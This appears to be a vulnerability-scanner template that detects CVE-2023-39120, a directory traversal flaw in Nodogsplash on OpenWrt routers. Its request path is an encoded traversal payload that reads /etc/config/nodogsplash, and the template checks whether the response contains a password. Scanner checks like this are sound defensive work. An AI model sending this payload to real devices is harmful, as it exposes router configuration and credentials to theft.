id: "nodogsplash-lfi"
name: "Nodogsplash - Directory Traversal"
severity: "high"
description: "Nodogsplash product was affected by a directory traversal vulnerability that also impacted the OpenWrt product. This vulnerability was addressed in Nodogsplash version 5.0.1. Exploiting this vulnerability, remote attackers could read arbitrary files from the target system."
tech:
  - "generic"
tags:
  - "lfi"
  - "openwrt"
  - "nodogsplash"
  - "vuln"
cwe: "CWE-22"
reference: "https://nvd.nist.gov/vuln/detail/CVE-2023-39120"
spaExclusion: true
request:
  method: "GET"
  path: "/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/config/nodogsplash"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "nodogsplash"
      - "password"
    condition: "and"
  - type: "word"
    part: "header"
    words:
      - "application/octet-stream"
  - type: "status"
    status:
      - 200
